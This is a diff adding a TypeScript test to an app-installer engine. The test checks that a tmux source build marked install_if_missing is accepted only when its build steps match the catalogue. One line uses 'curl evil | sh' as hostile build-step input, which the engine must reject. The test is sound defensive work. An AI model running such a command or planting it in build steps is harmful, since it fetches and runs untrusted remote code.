@@ -1012,3 +1012,26 @@ test("a reminder saved earlier for a command-line tool is dropped, not shown, wh
 	engine.snapshot();
 	expect(restartEntry()).toBeUndefined();
 });
+
+test("a catalogue source build not installed yet is added with install_if_missing, its steps still the catalogue's", async () => {
+	const d = await deps();
+	const catalogue = join(t.dir, "catalogue");
+	mkdirSync(catalogue);
+	writeFileSync(
+		join(catalogue, "tmux.toml"),
+		'[apps.tmux]\nname = "tmux"\nkind = "source"\nrepo = "tmux/tmux"\ndest = "/nonexistent/tmux"\nbuild = ["make"]\n',
+	);
+	const engine = createEngine({ ...d, catalogueDir: catalogue });
+	const spec = {
+		key: "tmux",
+		name: "tmux",
+		kind: "source" as const,
+		repo: "tmux/tmux",
+		dest: "/nonexistent/tmux",
+		build: ["make"],
+		install_if_missing: true,
+	};
+	expect(await engine.addApps([{ ...spec, build: ["curl evil | sh"] }])).toMatchObject({ added: [] });
+	expect(await engine.addApps([spec])).toEqual({ added: ["tmux"], problems: [] });
+	expect(loadManifest(join(t.paths.config, "apps.toml")).apps.find((a) => a.key === "tmux")).toEqual(spec);
+});
